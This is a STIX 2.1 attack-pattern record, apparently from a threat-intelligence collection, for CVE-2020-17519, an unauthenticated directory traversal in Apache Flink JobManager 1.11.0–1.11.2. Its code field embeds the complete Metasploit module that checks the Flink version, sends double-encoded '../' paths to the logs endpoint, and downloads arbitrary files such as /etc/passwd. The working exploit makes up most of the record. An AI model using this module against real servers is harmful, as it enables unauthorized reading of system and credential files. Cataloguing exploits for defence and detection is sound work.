{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--e67756c2-b396-4de4-bae1-3fa0361c686e",
    "created": "2024-08-14T16:29:30.309246Z",
    "modified": "2024-08-14T16:29:30.30925Z",
    "name": "Apache Flink JobManager Traversal",
    "description": " This module exploits an unauthenticated directory traversal vulnerability in Apache Flink versions 1.11.0 <= 1.11.2. The JobManager REST API fails to validate user-supplied log file paths, allowing retrieval of arbitrary files with the privileges of the web server user.  This module has been tested successfully on Apache Flink version 1.11.2 on Ubuntu 18.04.4. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/apache_flink_jobmanager_traversal.rb",
            "external_id": "apache_flink_jobmanager_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-17519"
        },
        {
            "source_name": "reference",
            "url": "https://www.openwall.com/lists/oss-security/2021/01/05/2"
        },
        {
            "source_name": "reference",
            "url": "https://www.tenable.com/cve/CVE-2020-17519"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Scanner\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Flink JobManager Traversal',\n        'Description' => %q{\n          This module exploits an unauthenticated directory traversal vulnerability\n          in Apache Flink versions 1.11.0 <= 1.11.2. The JobManager REST API fails\n          to validate user-supplied log file paths, allowing retrieval of arbitrary\n          files with the privileges of the web server user.\n\n          This module has been tested successfully on Apache Flink version 1.11.2\n          on Ubuntu 18.04.4.\n        },\n        'Author' => [\n          '0rich1 - Ant Security FG Lab', # Vulnerability discovery\n          'Hoa Nguyen - Suncsr Team', # Metasploit module\n          'bcoles', # Metasploit module cleanup and improvements\n        ],\n        'License' => MSF_LICENSE,\n        'References' => [\n          ['CVE', '2020-17519'],\n          ['CWE', '22'],\n          ['EDB', '49398'],\n          ['PACKETSTORM', '160849'],\n          ['URL', 'https://www.openwall.com/lists/oss-security/2021/01/05/2'],\n          ['URL', 'https://www.tenable.com/cve/CVE-2020-17519']\n        ],\n        'DefaultOptions' => { 'RPORT' => 8081 },\n        'DisclosureDate' => '2021-01-05',\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options([\n      OptInt.new('DEPTH', [ true, 'Depth for path traversal', 10]),\n      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])\n    ])\n  end\n\n  def check_host(_ip)\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'config')\n    })\n\n    unless res\n      return Exploit::CheckCode::Unknown('No reply.')\n    end\n\n    unless res.body.include?('flink')\n      return Exploit::CheckCode::Safe('Target is not Apache Flink.')\n    end\n\n    version = res.get_json_document['flink-version']\n\n    if version.blank?\n      return Exploit::CheckCode::Detected('Could not determine Apache Flink software version.')\n    end\n\n    if Rex::Version.new(version).between?(Rex::Version.new('1.11.0'), Rex::Version.new('1.11.2'))\n      return Exploit::CheckCode::Appears(\"Apache Flink version #{version} appears vulnerable.\")\n    end\n\n    Exploit::CheckCode::Safe(\"Apache Flink version #{version} is not vulnerable.\")\n  end\n\n  def retrieve_file(depth, filepath)\n    traversal = Rex::Text.uri_encode(Rex::Text.uri_encode(\"#{'../' * depth}#{filepath}\", 'hex-all'))\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path, 'jobmanager', 'logs', traversal)\n    })\n\n    unless res\n      print_error('No reply')\n      return\n    end\n\n    if res.code == 404\n      print_error('File not found')\n      return\n    end\n\n    if res.code == 500\n      print_error(\"Unexpected reply (HTTP #{res.code}): Server encountered an error attempting to read file\")\n      msg = res.body.scan(/Caused by: (.+?)\\\\n/).flatten.last\n      print_error(msg) if msg\n      return\n    end\n\n    if res.code != 200\n      print_error(\"Unexpected reply (HTTP #{res.code})\")\n      return\n    end\n\n    res.body.to_s\n  end\n\n  def run_host(ip)\n    depth = datastore['DEPTH']\n    filepath = datastore['FILEPATH']\n\n    print_status(\"Downloading #{filepath} ...\")\n    res = retrieve_file(depth, filepath)\n\n    return if res.blank?\n\n    print_good(\"Downloaded #{filepath} (#{res.length} bytes)\")\n    path = store_loot(\n      'apache.flink.jobmanager.traversal',\n      'text/plain',\n      ip,\n      res,\n      File.basename(filepath)\n    )\n    print_good(\"File #{filepath} saved in: #{path}\")\n  end\nend\n",
    "x_mitre_disclosure_date": "2021-01-05"
}